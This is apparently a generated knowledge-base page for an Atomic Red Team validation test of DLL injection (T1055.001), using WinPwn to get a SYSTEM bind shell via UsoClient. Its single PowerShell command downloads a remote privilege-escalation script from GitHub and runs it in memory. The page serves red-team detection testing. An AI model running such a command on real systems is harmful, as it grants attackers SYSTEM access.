---
atomic_guid: "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5"
title: "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique"
framework: "atomic"
generated: "true"
attack_technique_id: "T1055.001"
attack_technique_name: "Process Injection: Dynamic-link Library Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5"
  - "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique

Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn

## Metadata

- Atomic GUID: 8b56f787-73d9-4f1d-87e8-d07e89cbc7f5
- Technique: T1055.001: Process Injection: Dynamic-link Library Injection
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1055.001/T1055.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1055-process_injection|T1055.001]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055.001/T1055.001.yaml)
